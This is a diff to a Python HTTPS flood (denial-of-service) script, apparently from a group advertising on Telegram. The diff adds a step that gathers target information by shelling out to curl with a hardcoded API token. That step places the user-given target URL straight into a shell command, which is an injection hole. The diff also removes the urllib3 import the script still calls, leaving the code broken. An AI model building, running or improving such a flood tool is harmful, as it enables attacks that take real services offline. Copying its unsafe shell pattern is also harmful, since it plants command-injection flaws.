@@ -1,4 +1,3 @@
-
 #Developer
 #ARXU
 #Telegram : t.me/teamARXU
@@ -9,7 +8,8 @@ import threading
 import time
 import argparse
 import logging
-import urllib3
+import subprocess
+import json
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -23,6 +23,19 @@ def generate_user_agent():
         logging.error("ua.txt file not found.")
         return ""
 
+# Function to fetch target information
+def get_target_info(target):
+    try:
+        command = f'curl "ipinfo.io/{target}?token=ea645bb4d3ee99"'
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        if result.returncode == 0:
+            return json.loads(result.stdout)
+        else:
+            logging.error(f"Failed to fetch target information: {result.stderr}")
+            return {}
+    except Exception as e:
+        logging.error(f"An error occurred while fetching target information: {str(e)}")
+        return {}
 
 # Function to send HTTPS flood attack
 def https_flood(target_url, num_threads, duration):
@@ -65,13 +78,15 @@ def main():
 
     print(logo)
 
-
-
     parser = argparse.ArgumentParser(description='Launch an HTTPS flood attack.')
     parser.add_argument('target_url', type=str, help='Target URL')
     parser.add_argument('num_threads', type=int, help='Number of threads')
     parser.add_argument('duration', type=int, help='Attack duration in seconds')
     args = parser.parse_args()
+
+    # Gather target information
+    target_info = get_target_info(args.target_url)
+    print("Target Information:", target_info)
 
     # Start logging
     logging.info("Launching HTTPS attack...")
@@ -90,5 +105,4 @@ def main():
     logging.info("All threads have finished.")
 
 if __name__ == "__main__":
-    main()
-
+    main() 
